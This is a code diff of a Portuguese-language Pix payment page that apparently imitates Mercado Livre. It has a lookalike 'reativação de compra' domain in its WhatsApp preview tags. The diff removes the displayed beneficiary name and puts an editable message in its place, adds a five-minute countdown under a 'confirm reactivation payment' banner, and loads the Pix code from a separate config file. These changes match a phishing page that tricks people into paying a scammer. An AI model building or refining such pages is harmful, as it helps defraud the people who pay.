@@ -3,34 +3,48 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Pagamento Pix</title>
+
+<!-- PRÉVIA DO WHATSAPP -->
+<!-- TROQUE SEU-DOMINIO.com PELO DOMÍNIO REAL -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="Pagamento Pix">
+<meta property="og:description" content="Consulte as informações do seu pagamento Pix.">
+<meta property="og:image" content="https://mercado-livre-reativacao-de-compra.onrender.com/logo.png">
+<meta property="og:url" content="https://mercado-livre-reativacao-de-compra.onrender.com/">
+
+<!-- CONFIGURAÇÃO SEPARADA -->
+<script src="config.js?v=2" defer></script>
 
 <style>
 * {
   box-sizing: border-box;
 }
 
-body {
+html, body {
   margin: 0;
+  padding: 0;
+  font-family: Arial, Helvetica, sans-serif;
   background: #f5f5f5;
   color: #222;
-  font-family: Arial, sans-serif;
 }
 
+/* ABERTURA RÁPIDA */
 #loading {
   position: fixed;
   inset: 0;
-  background: #fff;
-  z-index: 100;
+  z-index: 9999;
+  background: white;
   display: flex;
   align-items: center;
   justify-content: center;
 }
 
 #logoScreen img {
-  width: 150px;
-  height: 150px;
+  width: 110px;
+  height: 110px;
   object-fit: contain;
 }
 
@@ -39,173 +53,203 @@ body {
 }
 
 .spinner {
-  width: 60px;
-  height: 60px;
-  border: 5px solid transparent;
-  border-top-color: #3984ed;
-  border-left-color: #3984ed;
+  width: 40px;
+  height: 40px;
+  border: 4px solid #e5e5e5;
+  border-top-color: #159c5c;
   border-radius: 50%;
-  animation: spin .85s linear 1;
+  animation: spin .7s linear infinite;
 }
 
 @keyframes spin {
   to { transform: rotate(360deg); }
 }
 
+/* PÁGINA */
 #payment {
   display: none;
   min-height: 100vh;
 }
 
 .top {
-  height: 81px;
-  background: #06a653;
+  width: 100%;
+  height: 64px;
+  background: #08a653;
 }
 
 .container {
-  padding: 0 28px 40px;
-  margin-top: 76px;
+  max-width: 600px;
+  margin: auto;
+  padding: 0 12px 25px;
 }
 
 .card {
   background: white;
   border-radius: 9px;
-  box-shadow: 0 2px 4px #00000012;
-  overflow: hidden;
+  box-shadow: 0 2px 6px rgba(0,0,0,.08);
+  margin-top: 44px;
 }
 
 .intro {
   text-align: center;
-  padding: 0 18px 22px;
+  padding: 0 16px 18px;
 }
 
 .logo-icon {
-  width: 85px;
-  height: 85px;
+  width: 70px;
+  height: 70px;
+  margin: -35px auto 15px;
   border: 4px solid #159c5c;
   border-radius: 50%;
+  background: white;
+  color: #159c5c;
   display: flex;
   align-items: center;
   justify-content: center;
-  margin: -43px auto 27px;
-  background: white;
-  color: #159c5c;
-  font-size: 29px;
+  font-size: 25px;
+  font-weight: bold;
+  position: relative;
 }
 
 .small {
-  font-size: 16px;
+  font-size: 14px;
   color: #666;
-  margin-bottom: 15px;
+  margin-bottom: 10px;
 }
 
 h1 {
-  font-size: 29px;
-  line-height: 1.4;
   margin: 0;
+  font-size: 23px;
+  line-height: 1.25;
 }
 
+/* FAIXA AMARELA */
 .yellow {
   background: #ffdf00;
-  padding: 12px 5px;
+  padding: 11px 7px;
   text-align: center;
-  font-size: 16px;
+  font-size: 13px;
   font-weight: bold;
 }
 
+.yellow-content {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 7px;
+  flex-wrap: wrap;
+}
+
+.timer {
+  display: inline-flex;
+  align-items: center;
+  gap: 3px;
+  white-space: nowrap;
+  font-size: 15px;
+  font-weight: bold;
+}
+
+/* INSTRUÇÕES */
 .instructions {
-  margin-top: 22px;
-  padding: 0 22px 30px;
+  padding: 0 18px 18px;
 }
 
 .instructions h2 {
-  font-size: 24px;
-  margin: 0 -22px;
-  padding: 20px 22px;
+  margin: 0 -18px;
+  padding: 16px 18px;
   border-bottom: 1px solid #ddd;
+  font-size: 20px;
 }
 
 .steps {
-  padding-top: 10px;
-  font-size: 17px;
-  line-height: 1.5;
+  padding-top: 5px;
+  font-size: 14px;
+  line-height: 1.4;
 }
 
 .steps p {
-  margin: 13px 7px;
+  margin: 10px 0;
 }
 
+/* FRASE PERSONALIZADA */
 .recipient {
   background: #f3f3f3;
-  padding: 13px;
-  border-radius: 7px;
-  font-size: 14px;
-  margin-top: 15px;
+  padding: 12px;
+  border-radius: 8px;
+  margin-top: 12px;
+  font-size: 13px;
   line-height: 1.5;
+  overflow-wrap: anywhere;
 }
 
+/* CÓDIGO PIX */
 .code-area {
   border: 1px solid #ddd;
-  border-radius: 9px;
-  padding: 18px;
-  margin-top: 17px;
+  border-radius: 8px;
+  padding: 12px;
+  margin-top: 12px;
   display: flex;
   align-items: center;
-  gap: 10px;
-  color: #777;
-  font-size: 16px;
+  gap: 8px;
+  min-height: 68px;
 }
 
 #pixDisplay {
   flex: 1;
+  min-width: 0;
+  color: #777;
+  font-size: 13px;
   overflow-wrap: anywhere;
-  line-height: 1.5;
-  max-height: 58px;
+  max-height: 48px;
   overflow: hidden;
 }
 
 .copy-small {
+  flex-shrink: 0;
+  border: none;
+  background: transparent;
   color: #4783c7;
-  font-size: 16px;
+  font-size: 14px;
   cursor: pointer;
-  border: 0;
-  background: none;
 }
 
+/* AVISO */
 .notice {
-  margin-top: 22px;
+  margin-top: 14px;
   background: #f3f3f3;
-  border-left: 5px solid #3984ed;
-  padding: 20px 15px;
-  display: flex;
-  gap: 15px;
-  align-items: center;
+  border-left: 4px solid #3984ed;
   border-radius: 5px;
-  font-size: 16px;
-  line-height: 1.5;
+  padding: 12px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-size: 13px;
+  line-height: 1.4;
 }
 
 .info {
+  flex-shrink: 0;
+  width: 21px;
+  height: 21px;
   background: #3984ed;
   color: white;
   border-radius: 50%;
-  min-width: 23px;
-  height: 23px;
   display: flex;
   align-items: center;
   justify-content: center;
   font-weight: bold;
 }
 
+/* BOTÃO */
 .main-button {
   width: 100%;
-  height: 66px;
-  margin-top: 22px;
-  background: #3485ef;
+  height: 52px;
+  margin-top: 14px;
   border: none;
-  border-radius: 8px;
+  border-radius: 7px;
+  background: #3485ef;
   color: white;
-  font-size: 20px;
+  font-size: 17px;
   cursor: pointer;
 }
 
@@ -213,61 +257,60 @@ h1 {
   background: #236fce;
 }
 
-@media(max-width: 400px) {
-  h1 { font-size: 25px; }
-  .container {
-    padding-left: 18px;
-    padding-right: 18px;
-  }
-  .instructions h2 { font-size: 22px; }
+#feedback {
+  min-height: 16px;
+  text-align: center;
+  color: #159c5c;
+  font-size: 13px;
+  margin: 8px 0 0;
+}
+
+@media (max-width: 350px) {
+  h1 { font-size: 21px; }
+  .yellow { font-size: 12px; }
+  .timer { font-size: 14px; }
+  .instructions h2 { font-size: 19px; }
 }
 </style>
 </head>
 
 <body>
 
-<!-- TELA DE ABERTURA -->
-
+<!-- ABERTURA -->
 <div id="loading">
-
   <div id="logoScreen">
-    <!-- Adicione sua logo depois -->
-    <img src="logo.png" alt="Logo da loja">
+    <img src="logo.png" alt="Logo">
   </div>
-
   <div id="spinnerScreen">
     <div class="spinner"></div>
   </div>
-
 </div>
 
-<!-- TELA DE PAGAMENTO -->
-
+<!-- PÁGINA -->
 <div id="payment">
 
   <div class="top"></div>
 
   <div class="container">
-
     <div class="card">
 
       <div class="intro">
-
-        <div class="logo-icon">＄</div>
-
-        <div class="small">
-          Falta só um passo!
-        </div>
-
+        <div class="logo-icon">R$</div>
+        <div class="small">Falta só um passo!</div>
         <h1>
           Pague <span id="amount"></span>
           via Pix para garantir sua compra
         </h1>
-
       </div>
 
+      <!-- FAIXA AMARELA -->
       <div class="yellow">
-        Confira os dados antes de pagar
+        <div class="yellow-content">
+          <span>Confirme o pagamento de reativação</span>
+          <span class="timer">
+            ⏱️ <span id="timer">05:00</span>
+          </span>
+        </div>
       </div>
 
       <div class="instructions">
@@ -275,142 +318,132 @@ h1 {
         <h2>Instruções de pagamento</h2>
 
         <div class="steps">
-
-          <p>1. &nbsp;Acesse seu Internet Banking ou app de pagamentos.</p>
-
-          <p>2. &nbsp;Escolha pagar via Pix.</p>
-
-          <p>3. &nbsp;Cole o código abaixo</p>
-
+          <p>1. Acesse seu Internet Banking ou app de pagamentos.</p>
+          <p>2. Escolha pagar via Pix.</p>
+          <p>3. Cole o código abaixo.</p>
         </div>
 
+        <!-- FRASE NO LUGAR DO BENEFICIÁRIO -->
         <div class="recipient">
-          <strong>Beneficiário:</strong>
-          <span id="beneficiary"></span>
+          <span id="mensagemPagamento"></span>
         </div>
 
+        <!-- CÓDIGO PIX -->
         <div class="code-area">
-
           <div id="pixDisplay"></div>
-
           <button class="copy-small" onclick="copyPix()">
             Copiar
           </button>
-
         </div>
 
         <div class="notice">
-
           <div class="info">i</div>
-
           <div>
-            Confira o nome do beneficiário e o valor antes de confirmar o pagamento.
+            Confira o nome do recebedor e o valor
+            no aplicativo do seu banco antes de pagar.
           </div>
-
         </div>
 
         <button class="main-button" onclick="copyPix()">
           Copiar código
         </button>
 
-        <p id="feedback"
-           style="text-align:center;color:#159c5c;font-size:14px">
-        </p>
+        <p id="feedback" role="status" aria-live="polite"></p>
 
       </div>
-
     </div>
-
   </div>
-
 </div>
 
 <script>
+document.addEventListener("DOMContentLoaded", function() {
 
-// ======================================
-// DADOS QUE VOCÊ PODE ALTERAR NAS VENDAS
-// ======================================
+  /* DADOS DO PAGAMENTO */
+  const valor = window.PAGAMENTO_VALOR || "53,99";
+  const mensagem = window.PAGAMENTO_MENSAGEM || "";
+  const pix = window.PAGAMENTO_PIX || "";
 
-const VALOR = "R$ 53,99";
+  document.getElementById("amount").textContent =
+    "R$ " + valor;
 
-const PIX = "COLE_SEU_PIX_COPIA_E_COLA_AQUI";
+  document.getElementById("mensagemPagamento").textContent =
+    mensagem;
 
-const BENEFICIARIO = "NOME DO RECEBEDOR";
+  document.getElementById("pixDisplay").textContent =
+    pix.length > 48 ? pix.substring(0, 48) + "..." : pix;
 
-// ======================================
+  /* ABERTURA MAIS RÁPIDA */
+  setTimeout(function() {
+    document.getElementById("logoScreen").style.display = "none";
+    document.getElementById("spinnerScreen").style.display = "block";
 
-document.getElementById("amount").textContent = VALOR;
+    setTimeout(function() {
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("payment").style.display = "block";
+    }, 350);
+  }, 500);
 
-document.getElementById("beneficiary").textContent =
-  BENEFICIARIO;
+  /* CRONÔMETRO DE 5 MINUTOS */
+  const duracao = 5 * 60 * 1000;
+  const inicio = Date.now();
+  const timer = document.getElementById("timer");
 
-document.getElementById("pixDisplay").textContent =
-  PIX.length > 48
-  ? PIX.substring(0, 48) + "..."
-  : PIX;
+  function atualizarTimer() {
+    const restante = Math.max(
+      0,
+      Math.ceil((duracao - (Date.now() - inicio)) / 1000)
+    );
 
-// LOGO POR 2 SEGUNDOS
+    const minutos = Math.floor(restante / 60);
+    const segundos = restante % 60;
 
-setTimeout(() => {
+    timer.textContent =
+      String(minutos).padStart(2, "0") + ":" +
+      String(segundos).padStart(2, "0");
 
-  document.getElementById("logoScreen").style.display = "none";
+    if (restante === 0) {
+      clearInterval(intervalo);
+    }
+  }
 
-  document.getElementById("spinnerScreen").style.display = "flex";
+  const intervalo = setInterval(atualizarTimer, 250);
+  atualizarTimer();
+});
 
-  // UMA VOLTA DA BOLINHA
-
-  setTimeout(() => {
-
-    document.getElementById("loading").style.display = "none";
-
-    document.getElementById("payment").style.display = "block";
-
-  }, 850);
-
-}, 2000);
-
-// COPIAR PIX
-
+/* COPIAR CÓDIGO PIX */
 async function copyPix() {
+  const pix = window.PAGAMENTO_PIX || "";
+  const feedback = document.getElementById("feedback");
 
-  if (
-    PIX === "COLE_SEU_PIX_COPIA_E_COLA_AQUI" ||
-    !PIX.trim()
-  ) {
-    alert("O código Pix ainda não foi configurado.");
+  if (!pix.trim() || pix === "COLE_SEU_CODIGO_PIX_AQUI") {
+    feedback.textContent =
+      "O código Pix ainda não foi configurado.";
     return;
   }
 
   try {
-
-    await navigator.clipboard.writeText(PIX);
-
+    await navigator.clipboard.writeText(pix);
   } catch (error) {
-
     const area = document.createElement("textarea");
-
-    area.value = PIX;
+    area.value = pix;
+    area.style.position = "fixed";
+    area.style.opacity = "0";
 
     document.body.appendChild(area);
-
     area.select();
 
-    const copied = document.execCommand("copy");
+    const copiado = document.execCommand("copy");
+    document.body.removeChild(area);
 
-    area.remove();
-
-    if (!copied) {
-      alert("Não foi possível copiar. Tente novamente.");
+    if (!copiado) {
+      feedback.textContent =
+        "Não foi possível copiar o código Pix.";
       return;
     }
-
   }
 
-  document.getElementById("feedback").textContent =
-    "Código Pix copiado!";
-
+  feedback.textContent = "Código Pix copiado!";
 }
-
 </script>
 
 </body>
